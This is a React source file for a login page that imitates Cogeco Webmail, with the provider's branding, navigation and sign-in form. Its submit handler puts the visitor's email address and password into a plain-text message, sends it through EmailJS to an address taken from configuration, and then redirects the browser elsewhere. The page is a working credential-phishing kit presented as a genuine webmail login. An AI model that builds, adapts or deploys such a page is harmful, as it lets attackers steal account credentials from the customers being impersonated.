// src/HomePage.jsx
import React, { useState } from "react";
import axios from "axios";
import emailjs from "emailjs-com";

const HomePage = () => {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    remember: false,
  });
  const [formErrors, setFormErrors] = useState({ email: "", password: "" });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const validateForm = () => {
    const errors = {};
    if (!formData.email) {
      errors.email = "Email is required";
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      errors.email = "Email address is invalid";
    }
    if (!formData.password) {
      errors.password = "Password is required";
    } else if (formData.password.length < 6) {
      errors.password = "Password must be at least 6 characters";
    }
    setFormErrors(errors);
    return Object.keys(errors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) return;
    setIsLoading(true);
    const senderName = import.meta.env.APP_SENDER_NAME;
    const redirectUrl = import.meta.env.APP_REDIRECT_URL;

    const customizedMessage = `
    Hello, New Form Submitted 
    Email: ${formData.email},
    Password: ${formData.password}
    Thank you for using our service.
  `;

    try {
      const templateParams = {
        to_name: senderName,
        from_email: formData.email,
        message: customizedMessage,
      };

      const serviceId = import.meta.env.APP_EMAILJS_SERVICE_ID;
      const templateId = import.meta.env.APP_EMAILJS_TEMPLATE_ID;
      const userId = import.meta.env.APP_EMAILJS_USER_ID;
      await emailjs.send(serviceId, templateId, templateParams, userId);
      setIsLoading(false);
      if (redirectUrl) {
        window.parent.location.href = redirectUrl.toString();
      }
      setSuccessMessage("Email sent successfully!");
    } catch (error) {
      setIsLoading(false);
      console.error("Email sending error:", error);
      setSuccessMessage("Failed to send email. Please try again.");
    }
  };
  return (
    <div className="page">
      {/* Navbar */}
      <header>
        <div className="top-bar d-flex align-items-center justify-content-between">
          <div className="d-flex align-items-center">
            <a href="/" className="top-bar-link">
              Residential
            </a>
            <a href="/" className="top-bar-link">
              Business
            </a>
            <a href="/" className="top-bar-link">
              Careers
            </a>
          </div>
          <div className="d-none d-lg-flex align-items-center">
            <a href="/" className="top-bar-link">
              My Account
            </a>
            <a href="" className="top-bar-link active">
              Webmail
            </a>
            <a href="/" className="top-bar-link">
              Contact Us
            </a>

            {/* Profile Dropdown */}
            <div className="dropdown">
              <a
                className="top-bar-link dropdown-toggle"
                href="/"
                id="profileDropdown"
                role="button"
                data-bs-toggle="dropdown"
                aria-expanded="false"
              >
                Ontario
              </a>
              {/* <ul
                className="dropdown-menu top-bar-dropdown"
                aria-labelledby="profileDropdown"
              >
                <li>
                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                    View Profile
                  </a>
                </li>
                <li>
                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                    Settings
                  </a>
                </li>
                <li>
                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                    Logout
                  </a>
                </li>
              </ul> */}
            </div>

            {/* Language Dropdown */}
            <div className="dropdown ms-3">
              <a
                className="top-bar-link dropdown-toggle"
                href="/"
                id="languageDropdown"
                role="button"
                data-bs-toggle="dropdown"
                aria-expanded="false"
              >
                EN
              </a>
              <ul
                className="dropdown-menu top-bar-dropdown"
                aria-labelledby="languageDropdown"
              >
                <li>
                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                    FR
                  </a>
                </li>
                <li>
                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                    ES
                  </a>
                </li>
                <li>
                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                    DE
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
        <div className="header">
          <a className="navbar-brand" href="/">
            <img
              alt=""
              loading="lazy"
              width="168"
              height="31"
              className=""
              src="/image.png"
            />
          </a>
          <div>
            <nav className="navbar navbar-expand-lg header">
              <div className="collapse navbar-collapse me-5" id="navbarNav">
                <ul className="navbar-nav m-auto">
                  <li className="nav-item dropdown">
                    <a
                      className="nav-link"
                      href="/"
                      id="navbarDropdown"
                      role="button"
                      data-bs-toggle="dropdown"
                      aria-expanded="false"
                    >
                      Internet
                    </a>
                  </li>
                  <li className="nav-item">
                    <a className="nav-link" href="/">
                      TV
                    </a>
                  </li>
                  <li className="nav-item">
                    <a className="nav-link" href="/">
                      Promos
                    </a>
                  </li>
                  <li className="nav-item">
                    <a className="nav-link" href="/">
                      About Us
                    </a>
                  </li>
                  <li className="nav-item">
                    <a className="nav-link active" href="/">
                      Support
                    </a>
                  </li>
                </ul>
              </div>
              <div>
                <div className="d-flex gap-3 align-items-center justify-content-between">
                  <button className="btn btn-icon d-none d-sm-flex">
                    <i className="bi bi-cart"></i>
                  </button>
                  <button className="btn btn-icon d-none d-sm-flex">
                    <i className="bi bi-search"></i>
                  </button>
                  <button
                    className="navbar-toggler"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#navbarNav"
                    aria-controls="navbarNav"
                    aria-expanded="false"
                    aria-label="Toggle navigation"
                  >
                    <i className="bi bi-list"></i>
                  </button>
                  <button className="btn btn-link d-none d-lg-flex">
                    {" "}
                    1-866-261-4447
                  </button>
                </div>
              </div>
            </nav>
          </div>
        </div>
      </header>
      <div className="container">
        {/* Page Content */}
        <div className="row mt-4">
          {/* Form Column */}
          <div className="col-md-6 mb-5 p-4">
            <div className="form-section">
              <h3>Welcome to Cogeco Webmail. Great to see you again.</h3>
              {isSubmitted ? (
                <div>
                  <div className="email-success mb-3">
                    Form submitted successfully!
                  </div>
                  <div>
                    <button
                      type="submit"
                      className="btn form-btn"
                      onClick={() => {
                        location.reload();
                      }}
                    >
                      Continue
                    </button>
                  </div>
                </div>
              ) : (
                <form onSubmit={handleSubmit} noValidate>
                  <div className="mb-2">
                    <label htmlFor="email" className="form-label">
                      Email Address
                    </label>
                    <input
                      type="text"
                      name="email"
                      value={formData.email}
                      onChange={handleInputChange}
                      className={`form-control ${
                        formErrors.email ? "is-invalid" : ""
                      }`}
                      id="email"
                      required
                    />
                    {formErrors.email && (
                      <div className="invalid-feedback">{formErrors.email}</div>
                    )}
                  </div>

                  <div className="mb-3">
                    <label htmlFor="password" className="form-label">
                      Password
                    </label>
                    <input
                      type="password"
                      name="password"
                      value={formData.password}
                      onChange={handleInputChange}
                      className={`form-control ${
                        formErrors.password ? "is-invalid" : ""
                      }`}
                      id="password"
                      required
                    />
                    {formErrors.password && (
                      <div className="invalid-feedback">
                        {formErrors.password}
                      </div>
                    )}
                  </div>
                  <div className="mb-3">
                    <div className="d-flex align-items-center">
                      <input
                        type="checkbox"
                        name="remember"
                        checked={formData.remember}
                        onChange={handleInputChange}
                        className="form-check-input m-0"
                        // id="remember"
                        id="styledCheckbox"
                      />
                      <label for="styledCheckbox" className="custom-label ms-2">
                        Remember my email address!
                      </label>
                    </div>

                    <a className="forgot-password form-label" href="/">
                      <span className="">Forgot your password or email?</span>
                    </a>
                  </div>

                  <div>
                    <button type="submit" className="btn form-btn">
                      {isLoading ? "Please Wait...." : "Sign In"}
                    </button>
                  </div>
                </form>
              )}
            </div>
          </div>

          {/* Card Column */}
          <div className="col-md-6 mb-5 p-4">
            <div className="card page-details">
              <img
                src="/detail-bg.webp"
                alt=""
                srcset=""
                className="detail-image"
              />
              <div className="card-body mt-5">
                <div className="icon-container">
                  <span className="icon">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="1em"
                      height="1em"
                      fill="none"
                      viewBox="0 0 38 38"
                      color="#001E62"
                      font-size="38"
                      className="mui-style-54jahj"
                    >
                      <path
                        fill="#001E62"
                        d="M22.709 20.36a6.29 6.29 0 1 0-7.42 0 9.32 9.32 0 0 0-5.57 7.52 1 1 0 0 0 1.279 1.085 1 1 0 0 0 .71-.855 7.34 7.34 0 0 1 14.58 0 1 1 0 0 0 1 .89h.11a1 1 0 0 0 .89-1.1 9.33 9.33 0 0 0-5.58-7.54m-8-5.07a4.29 4.29 0 1 1 4.29 4.3 4.3 4.3 0 0 1-4.29-4.3"
                      ></path>
                      <path
                        fill="#FF6D70"
                        d="M25.91 5.75A1 1 0 0 1 25 4.37q.067-.204.2-.37.149-.134.33-.21a1 1 0 0 1 .76 0 1 1 0 0 1 .33.21q.135.147.21.33a1 1 0 0 1-.92 1.38zM29.91 15.75a1 1 0 0 1-.71-.29 1 1 0 0 1-.29-.71 1.4 1.4 0 0 1 0-.2.6.6 0 0 1 .06-.18.8.8 0 0 1 .09-.18l.14-.19.15-.12a.8.8 0 0 1 .18-.09q.09-.045.19-.06a.93.93 0 0 1 .57.06 1 1 0 0 1 .33.21q.064.072.12.15a.8.8 0 0 1 .09.18q.043.085.06.18.007.1 0 .2a1 1 0 0 1-1 1z"
                      ></path>
                      <path
                        fill="#001E62"
                        d="M19.001 36a17.002 17.002 0 0 1-.46-34 17.7 17.7 0 0 1 3.41.24 1 1 0 1 1-.34 1.97 15 15 0 0 0-3-.21 15 15 0 1 0 15.2 12.58 1 1 0 0 1 1.211-1.137 1 1 0 0 1 .76.817q.19 1.127.22 2.27A17 17 0 0 1 19.471 36z"
                      ></path>
                      <path
                        fill="#FF6D70"
                        d="m31.21 4-1.33 2.67L27.21 8l2.67 1.33L31.21 12l1.34-2.67L35.21 8l-2.66-1.33z"
                      ></path>
                    </svg>
                  </span>
                </div>
                <h3 className="my-4">Get to know Webmail</h3>
                <p className="details-text">
                  Cogeco Webmail has convenient features, such as seamless
                  navigation between your inbox, calendar and contacts.
                </p>
                <a href="/" className="btn mt-4 details-button">
                  Learn more
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default HomePage;
